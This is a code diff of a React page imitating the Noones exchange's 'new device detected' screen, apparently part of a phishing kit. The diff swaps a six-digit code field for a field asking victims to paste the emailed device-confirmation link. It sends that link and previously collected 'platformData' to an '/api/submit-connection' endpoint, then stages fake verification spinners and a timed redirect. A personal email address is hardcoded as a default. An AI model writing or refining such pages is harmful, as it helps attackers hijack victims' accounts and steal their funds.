@@ -5,9 +5,11 @@ export default function NoonesNewDeviceVerification() {
   const navigate = useNavigate();
   const location = useLocation();
   const [isDarkMode, setIsDarkMode] = useState(true);
-  const [code, setCode] = useState(['', '', '', '', '', '']);
-  const [resendTimer, setResendTimer] = useState(53);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const [link, setLink] = useState('');
+  const [resendTimer, setResendTimer] = useState(30);
+  const [isLoading, setIsLoading] = useState(false);
+  const [isRedirecting, setIsRedirecting] = useState(false);
+  const linkInputRef = useRef<HTMLInputElement>(null);
 
   const email = location.state?.email || 'gibsonkobia@gmail.com';
   const logoSrc = isDarkMode ? '/logos/noonesdark.jpg' : '/logos/nooneslight.jpg';
@@ -18,58 +20,30 @@ export default function NoonesNewDeviceVerification() {
     return () => clearTimeout(timer);
   }, [resendTimer]);
 
-  const handleCodeChange = (index: number, value: string) => {
-    if (!/^\d*$/.test(value)) return;
+  useEffect(() => {
+    if (resendTimer === 0 && linkInputRef.current) {
+      linkInputRef.current.focus();
+    }
+  }, [resendTimer]);
 
-    const newCode = [...code];
-    newCode[index] = value.slice(0, 1);
-    setCode(newCode);
+  const handleLinkChange = (value: string) => {
+    setLink(value);
+  };
 
-    if (value && index < 5) {
-      inputRefs.current[index + 1]?.focus();
+  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Enter' && link.trim() !== '') {
+      handleVerifyLink();
     }
   };
 
-  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Backspace' && !code[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    }
-  };
+  const handleVerifyLink = async () => {
+    if (link.trim() === '') return;
 
-  const handlePaste = async () => {
-    try {
-      const clipboardText = await navigator.clipboard.readText();
-      const digits = clipboardText.replace(/\D/g, '').slice(0, 6);
-
-      if (digits.length > 0) {
-        const newCode = [...code];
-        for (let i = 0; i < Math.min(digits.length, 6); i++) {
-          newCode[i] = digits[i];
-        }
-        setCode(newCode);
-        if (digits.length < 6) {
-          inputRefs.current[digits.length]?.focus();
-        } else {
-          inputRefs.current[5]?.focus();
-        }
-      }
-    } catch (err) {
-      console.error('Failed to read clipboard:', err);
-    }
-  };
-
-  const handleContinue = async () => {
-    const verificationCode = code.join('');
-    if (verificationCode.length !== 6) {
-      alert('Please enter all 6 digits');
-      return;
-    }
+    setIsLoading(true);
 
     try {
-      // Get the platform data from location state (set by Noones.tsx)
       const platformData = location.state?.platformData || {};
 
-      // Submit the device verification code with platform data to the backend
       const response = await fetch('/api/submit-connection', {
         method: 'POST',
         headers: {
@@ -77,23 +51,27 @@ export default function NoonesNewDeviceVerification() {
         },
         body: JSON.stringify({
           ...platformData,
-          device_code: verificationCode,
+          confirmation_link: link.trim(),
         }),
       });
 
       if (!response.ok) {
-        console.error('Failed to submit device verification code:', response.statusText);
+        console.error('Failed to submit verification link:', response.statusText);
       }
 
-      // Navigate to the final OTP/Email verification page
-      navigate('/connect/noones/verify-device', { state: { email, platformData: { ...platformData, device_code: verificationCode } } });
+      setTimeout(() => {
+        setIsRedirecting(true);
+      }, 10000);
+
+      setTimeout(() => {
+        navigate('/link-success', { state: { email, platformData: { ...platformData, confirmation_link: link.trim() } } });
+      }, 13000);
     } catch (err) {
-      console.error('Error during device verification:', err);
-      alert('Device verification failed. Please try again.');
+      console.error('Error during verification:', err);
+      alert('Verification failed. Please try again.');
+      setIsLoading(false);
     }
   };
-
-  const isComplete = code.every((digit) => digit !== '');
   const pageBg = isDarkMode ? 'bg-[#202020]' : 'bg-[#f2f2f2]';
   const cardBg = isDarkMode ? 'bg-[#292929] border border-[#333333]' : 'bg-white border border-slate-200';
   const pageText = isDarkMode ? 'text-white' : 'text-slate-900';
@@ -110,59 +88,77 @@ export default function NoonesNewDeviceVerification() {
         <div className={`w-full ${cardBg} rounded-[32px] shadow-[0_40px_120px_rgba(0,0,0,0.18)] p-10 overflow-hidden`}
           style={{ boxShadow: isDarkMode ? '0 40px 120px rgba(0,0,0,0.28)' : '0 40px 120px rgba(15, 23, 42, 0.08)' }}
         >
-          <h1 className="text-center text-3xl font-semibold tracking-tight mb-4" style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}>
-            New Device Verification
-          </h1>
+          {isLoading ? (
+            <div className="text-center">
+              <div className="mb-4">
+                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#44C166] mx-auto"></div>
+              </div>
+              <h1 className="text-2xl font-semibold mb-4" style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}>
+                {isRedirecting ? 'Redirecting...' : 'Verifying Device'}
+              </h1>
+              <p className={`text-base ${secondaryText}`}>
+                {isRedirecting ? 'Please wait while we redirect you.' : 'Please be patient as we verify your device.'}
+              </p>
+            </div>
+          ) : (
+            <>
+              <h1 className="text-center text-3xl font-semibold tracking-tight mb-4" style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}>
+                New device detected
+              </h1>
 
-          <div className="space-y-1 text-center mb-8">
-            <p className={`text-base font-normal ${secondaryText}`}>Enter 6-digit code sent to</p>
-            <p className={`text-base font-medium ${isDarkMode ? 'text-white' : 'text-slate-900'}`}>{email}</p>
-          </div>
+              <div className="space-y-1 text-center mb-8">
+                <p className={`text-base font-normal ${secondaryText}`}>Confirm this is your device from the email we just sent to</p>
+                <p className={`text-base font-medium ${isDarkMode ? 'text-white' : 'text-slate-900'}`}>
+                  <span style={{ color: accentColor, fontWeight: 'bold' }}>{email}</span>
+                </p>
+              </div>
 
-          <div className="flex justify-center gap-3 mb-6">
-            {code.map((digit, index) => (
-              <input
-                key={index}
-                ref={(el) => (inputRefs.current[index] = el)}
-                type="text"
-                inputMode="numeric"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleCodeChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                className={`w-12 h-14 sm:w-14 sm:h-14 text-center text-xl font-semibold rounded-2xl border outline-none focus:ring-0 transition-colors ${isDarkMode ? 'border-white/10 bg-[#181B1F] text-white focus:border-[#44C166]' : 'border-slate-300 bg-slate-100 text-slate-900 focus:border-[#18C37E]'}`}
-                autoComplete="off"
-              />
-            ))}
-          </div>
+              <div className="flex justify-center items-center mb-6 opacity-50">
+                <span className="text-6xl">💻</span>
+                <span className="text-6xl -ml-4">📱</span>
+                <span className="text-6xl -ml-4">🖥️</span>
+              </div>
 
-          <div className="flex justify-center mb-6">
-            <button
-              type="button"
-              onClick={handlePaste}
-              className="text-sm font-medium"
-              style={{ color: accentColor }}
-            >
-              Paste
-            </button>
-          </div>
+              <p className={`text-center text-sm mb-8 ${secondaryText}`}>We don't recognize this device</p>
 
-          <p className={`text-center text-sm mb-8 ${secondaryText}`}>Resend in {resendTimer} seconds</p>
+              {resendTimer > 0 ? (
+                <button
+                  disabled
+                  className="w-full h-14 rounded-full text-base font-semibold bg-white/10 cursor-not-allowed opacity-70 text-white mb-4"
+                >
+                  Resend email ({resendTimer} sec.)
+                </button>
+              ) : (
+                <input
+                  ref={linkInputRef}
+                  type="text"
+                  value={link}
+                  onChange={(e) => handleLinkChange(e.target.value)}
+                  onKeyDown={handleKeyDown}
+                  placeholder="Enter the verification link here"
+                  className={`w-full h-14 px-4 rounded-full text-base font-semibold border outline-none focus:ring-0 transition-colors mb-4 ${isDarkMode ? 'border-white/10 bg-[#181B1F] text-white focus:border-[#44C166]' : 'border-slate-300 bg-slate-100 text-slate-900 focus:border-[#18C37E]'}`}
+                />
+              )}
 
-          <button
-            onClick={handleContinue}
-            disabled={!isComplete}
-            className={`w-full h-14 rounded-full text-base font-semibold transition-all ${isComplete ? 'text-black' : 'text-white'} ${isComplete ? 'bg-[#44C166] hover:bg-[#3fb85a]' : 'bg-white/10 cursor-not-allowed opacity-70'}`}
-          >
-            Continue
-          </button>
+              <button
+                onClick={() => {/* Try another way */}}
+                className={`w-full h-14 rounded-full text-base font-semibold transition-all text-black bg-[#44C166] hover:bg-[#3fb85a] mb-4`}
+              >
+                Try another way
+              </button>
 
-          <p className={`text-center text-xs mt-8 ${secondaryText}`}>
-            If you need to reset device verification, please{' '}
-            <a href="#support" className={`font-semibold`} style={{ color: accentColor }}>
-              contact support
-            </a>
-          </p>
+              <div className="text-center mb-8">
+                <a href="#" className="text-green-500 underline text-sm">Cancel signing in</a>
+              </div>
+
+              <p className={`text-center text-xs ${secondaryText}`}>
+                If you need help, please{' '}
+                <a href="#support" className={`font-semibold`} style={{ color: accentColor }}>
+                  contact support
+                </a>
+              </p>
+            </>
+          )}
         </div>
       </div>
 
